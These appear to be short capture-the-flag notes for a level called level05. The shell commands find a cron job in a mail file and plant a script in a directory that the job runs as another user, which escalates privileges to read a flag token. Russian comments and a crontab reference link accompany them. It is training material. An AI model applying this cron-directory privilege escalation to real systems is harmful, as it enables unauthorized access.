```
find / -user flag05 2>/dev/null

env
MAIL=/var/mail/level05
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
cat /usr/sbin/openarenaserver
cd /opt/openarenaserver/
echo "getflag > /tmp/flag05" > script
Ждем 2 минуты
cat /tmp/flag05
Увидим токен
```
[Crontab guru](https://crontab.guru/#*/2_*_*_*_*)